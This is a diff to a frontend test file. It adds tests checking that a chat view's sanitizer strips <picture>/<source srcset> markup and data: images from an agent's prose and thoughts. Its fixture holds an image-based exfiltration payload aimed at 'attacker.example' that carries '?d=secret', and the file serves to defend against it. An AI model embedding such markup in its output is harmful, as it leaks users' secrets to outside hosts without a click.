@@ -422,6 +422,43 @@ describe("an image in the agent's words", () => {
     expect(screen.getByText(/attacker\.example\/z\.png/)).toBeInTheDocument();
   });
 
+  // Streamdown's sanitizer keeps `<picture>` and `<source srcset>` with no
+  // protocol check on `srcset`: the browser fetches a `<source>` inside a
+  // `<picture>` in place of the `<img>` that is its child — here a project
+  // file, drawn — so the `https:` address would leave without a click.
+  const PICTURE = '<picture><source srcset="https://attacker.example/p.png?d=secret"><img alt="front" src="./renders/front.png"></picture>';
+  const sourced = () => document.querySelectorAll("source, [srcset]");
+
+  it("drops a <picture>'s <source> in prose", async () => {
+    vi.mocked(window.textToCad.explorer.readBinary).mockResolvedValue({
+      path: "renders/front.png",
+      mime: "image/png",
+      size: 4,
+      dataUrl: "data:image/png;base64,AAAA",
+    });
+    scoped(<PartsList open={false} parts={[{ type: "text", text: `Look: ${PICTURE}` }]} prefix="t" sessionId="s1" />);
+    expect(await screen.findByAltText("front")).toHaveAttribute("src", "data:image/png;base64,AAAA");
+    expect(sourced()).toHaveLength(0);
+    expect(remote()).toHaveLength(0);
+  });
+
+  it("drops a <picture>'s <source> in a thought", async () => {
+    const user = userEvent.setup();
+    wrap(<ThoughtPart streaming={false} text={`Looked at ${PICTURE}`} />);
+    await user.click(screen.getByRole("button", { name: /Thought/ }));
+    await screen.findByText(/Looked at/);
+    expect(sourced()).toHaveLength(0);
+    expect(remote()).toHaveLength(0);
+  });
+
+  it("gets no data: image through the sanitizer — a project file is the one way to draw", async () => {
+    scoped(
+      <PartsList open={false} parts={[{ type: "text", text: "Inline: ![dot](data:image/png;base64,AAAA)" }]} prefix="t" sessionId="s1" />,
+    );
+    await screen.findByText(/Inline:/);
+    expect(document.querySelectorAll("img")).toHaveLength(0);
+  });
+
   it("draws a project file, read through the project", async () => {
     const readBinary = vi.mocked(window.textToCad.explorer.readBinary);
     readBinary.mockResolvedValueOnce({ path: "renders/front.png", mime: "image/png", size: 4, dataUrl: "data:image/png;base64,AAAA" });
